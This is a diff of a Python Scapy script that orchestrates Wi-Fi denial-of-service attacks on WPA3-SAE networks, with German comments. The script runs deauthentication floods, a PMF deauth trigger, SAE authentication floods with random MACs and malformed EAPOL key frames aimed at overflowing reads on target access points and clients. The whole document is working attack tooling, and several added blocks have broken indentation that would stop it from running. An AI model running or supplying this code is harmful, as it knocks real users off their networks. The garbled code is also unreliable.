@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ================================================================================
-Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
+Wi-Fi DoS Orchestrator
 ================================================================================
 Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
 Journal of Information Security and Applications (2022)
@@ -97,20 +97,10 @@ TARGET_STA_MACS = [
 
 # --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
 ADAPTER_KONFIGURATION = {
-    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
-#    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},    
-#   "wlan4mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
-   "wlan3mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
-   "wlan5mon": {"band": "5GHz", "angriff": "cookie_guzzler"}#, 
-#    "wlan5mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"}#,       
-#    "wlan0mon": {"band": "2.4GHz", "angriff": "deauth_flood"},
-#    "wlan1mon": {"band": "2.4GHz", "angriff": "deauth_flood"}#,
-#    "wlan0mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
-#    "wlan2mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
-#    "wlan7mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
-#    "wlan11mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
-#    "wlan5mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
-#    "wlan9mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}            
+#   "wlan0mon": {"band": "5GHz", "angriff": "cookie_guzzler"}, 
+    "wlan1mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"},       
+#    "wlan2mon": {"band": "2.4GHz", "angriff": "deauth_flood"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "deauth_flood"}   
 }
 
 # --- SAE PARAMETERS (SPLIT FOR 2.4 GHz AND 5 GHz) ---
@@ -127,64 +117,115 @@ SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'
 # ======================== SCRIPT LOGIC STARTS HERE ========================
 def run_deauth_disassoc_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
     from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
-    print(f"[INFO-DEAUTH] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
+    print(f"[INFO-DEAUTH] Process {interface} ({attack_type}) started on CH {channel}...")
+    
     try:
         subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(f"[SUCCESS-DEAUTH] Channel for {interface} set to {channel}.")
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        print(f"[ERROR-DEAUTH] Channel switch for {interface} failed.")
-        return
+    except: return
+
     try:
-        if not sta_mac_list: print(f"[WARNING-DEAUTH] No target client for {interface}. Process paused."); time.sleep(999); return
+        if not sta_mac_list: 
+            print(f"[WARNING] No targets for {interface}. Paused.")
+            time.sleep(999); return
+            
         while True:
+            packet_list = []
+            
             for sta_mac in sta_mac_list:
-                packets = [RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), RadioTap()/Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid)/Dot11Deauth(reason=7)]
-                burst_count = 5 if attack_type == "pmf_deauth_exploit" else 50
-                sendp(packets, count=burst_count, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += burst_count * 2
-            sleep_time = 15 if attack_type == "pmf_deauth_exploit" else 0.2
-            time.sleep(sleep_time)
+                # Frame 1: AP -> Client (Du wurdest gekickt)
+                p1 = RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+                # Frame 2: Client -> AP (Ich gehe) - Optional, erhöht Verwirrung
+                p2 = RadioTap()/Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid)/Dot11Deauth(reason=7)
+                
+if attack_type == "pmf_deauth_exploit":
+    # Nur ein einzelner, gezielter Trigger-Frame reicht oft
+    packet_list = [p1] 
+    
+    # WICHTIG: Senden Sie dies NICHT sofort in einer Dauerschleife.
+    # Der Angriff verlangt: 
+    # 1. Router überlasten (durch andere Prozesse)
+    # 2. Einmalig kicken
+    # 3. Warten (damit der Client ins Timeout läuft)
+    
+    # Senden
+    try:
+        sendp(packet_list, count=1, verbose=0, iface=interface)
+        with counter.get_lock(): counter.value += 1
+    except: pass
+    
+    # LANGE PAUSE für den Timeout-Effekt beim Client
+    print(f"[{interface}] PMF Trigger sent. Waiting 15s for client timeout...")
+    time.sleep(15) 
+            else:
+                # Flood: Feuer frei
+                time.sleep(0.05)
+                
     except KeyboardInterrupt: pass
 
 def run_sae_attack_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
-    from scapy.all import sendp, Dot11, RadioTap, Dot11Auth, RandMAC, Raw
-    print(f"[INFO-SAE] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
+    from scapy.all import sendp, Dot11, RadioTap, Dot11Auth, RandMAC
+    print(f"[INFO-SAE] Process for {interface} ({attack_type}) started on CH {channel}...")
+    
+    # 1. Kanal setzen
     try:
         subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except (subprocess.CalledProcessError, FileNotFoundError): return
+    except: return
     
-    # Retrieve correct SAE parameters based on band passed via kwargs
-    scalar_hex = kwargs.get('scalar_hex')
-    finite_hex = kwargs.get('finite_hex')
-
-    if not scalar_hex or not finite_hex:
-        print(f"[ERROR-SAE] Missing SAE parameters for {interface}. Aborting.")
-        return
-
+    # 2. Parameter laden
     try:
-        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
-        SAE_FINITE_ELEMENT_BYTES = bytes.fromhex(finite_hex)
-    except ValueError:
-        print(f"[ERROR-SAE] Invalid HEX string for SAE parameters on {interface}.")
+        scalar = kwargs.get('scalar_hex', '').strip()
+        finite = kwargs.get('finite_hex', '').strip()
+        SAE_SCALAR_BYTES = bytes.fromhex(scalar)
+        SAE_FINITE_ELEMENT_BYTES = bytes.fromhex(finite)
+    except (ValueError, AttributeError):
+        print(f"[ERROR-SAE] Invalid SAE Params on {interface}. Stopping.")
         return
 
     try:
         while True:
-            mac_to_use = str(RandMAC())
-            dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_to_use, addr3=bssid)
-            packet = None
-
-            if attack_type == 'bad_algo': packet = RadioTap()/dot11/Dot11Auth(algo=5, seqnum=1, status=0)
-            elif attack_type == 'bad_seq': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=3, status=0)
-            elif attack_type == 'bad_status_code': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
-            elif attack_type == 'empty_frame_confirm': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=0)
-            elif attack_type == 'cookie_guzzler': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_ELEMENT_BYTES
+            packet_list = []
             
-            if packet:
-                burst_size = 128 if attack_type == 'cookie_guzzler' else 20
-                sendp(packet, count=burst_size, inter=0.005, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += burst_size
-            time.sleep(0.5)
+            # --- COOKIE GUZZLER (Wissenschaftliche Korrektur: Random MACs im Burst) ---
+            if attack_type == 'cookie_guzzler':
+                # Erzeuge 128 Pakete mit JEWEILS EIGENER Random MAC
+                for _ in range(128):
+                    mac_use = str(RandMAC())
+                    pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_use, addr3=bssid)/\
+                          Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_ELEMENT_BYTES
+                    packet_list.append(pkt)
+
+            # --- LOGIK ATTACKEN (Bad Algo, Bad Seq, etc.) ---
+            else:
+                # Hier reicht eine MAC pro Burst, aber wir brauchen den Speed
+                mac_use = str(RandMAC())
+                dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_use, addr3=bssid)
+                
+                base_auth = None
+                if attack_type == 'bad_algo': base_auth = Dot11Auth(algo=5, seqnum=1, status=0)
+                elif attack_type == 'bad_seq': base_auth = Dot11Auth(algo=3, seqnum=3, status=0) # Seq 3 ist invalid
+                elif attack_type == 'bad_status_code': base_auth = Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
+                elif attack_type == 'empty_frame_confirm': base_auth = Dot11Auth(algo=3, seqnum=2, status=0)
+                
+                if base_auth:
+                    # Payload hinzufügen wenn nötig (bad_algo braucht keine SAE Params meistens, aber wir senden SAE Struktur)
+                    # Für leere Frames lassen wir SAE Params weg
+                    pkt = RadioTap()/dot11/base_auth
+                    if attack_type not in ['empty_frame_confirm', 'bad_algo']:
+                         pkt /= (b'\x13\x00' + SAE_SCALAR_BYTES + SAE_FINITE_ELEMENT_BYTES)
+                    
+                    # Burst durch Vervielfachung
+                    packet_list = [pkt] * 64
+
+            # --- SENDEN (BURST MODE) ---
+            if packet_list:
+                try:
+                    # inter=0 zwingt den Kernel zum Batch-Versand
+                    sendp(packet_list, count=1, inter=0, iface=interface, verbose=0)
+                    with counter.get_lock(): counter.value += len(packet_list)
+                    time.sleep(0.02) # Minimale Pause für CPU
+                except OSError:
+                    time.sleep(0.1)
+
     except KeyboardInterrupt: pass
 
 def run_eapol_attack_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
@@ -198,12 +239,16 @@ def run_eapol_attack_process(interface, bssid, channel, sta_mac_list, attack_typ
         llc = LLC(); snap = SNAP(OUI=0x000000, code=0x888e); eapol = EAPOL(type=3)
         eapol_key = EAPOL_KEY()
         key_info_default = 0x008a
-        key_info_value = key_info_default | 0x0040 if malform_type == 'malformed_msg1_flags' else key_info_default
+        key_info_value = key_info_default | 0x0080 if malform_type == 'malformed_msg1_flags' else key_info_default
         if hasattr(eapol_key, 'key_info'): eapol_key.key_info = key_info_value
         elif hasattr(eapol_key, 'info'): eapol_key.info = key_info_value
         eapol_key.key_len=16; eapol_key.replay_ctr=1; eapol_key.nonce=os.urandom(32)
         packet = RadioTap()/dot11/llc/snap/eapol/eapol_key
-        if malform_type == 'malformed_msg1_length': packet /= Raw(load=b'\xdd\x01')
+        if malform_type == 'malformed_msg1_length':
+    # Wir sagen dem Router: "Hier kommen 256 Bytes Daten"
+    eapol_key.key_data_len = 256
+    # Aber wir senden tatsächlich nur 50 Bytes (Nullen) -> Buffer Underflow beim Lesen
+    packet /= Raw(load=b'\x00' * 50)
         return packet
     try:
         if not sta_mac_list: print(f"[WARNING-EAPOL] No target client for {interface}. Process paused."); time.sleep(999); return
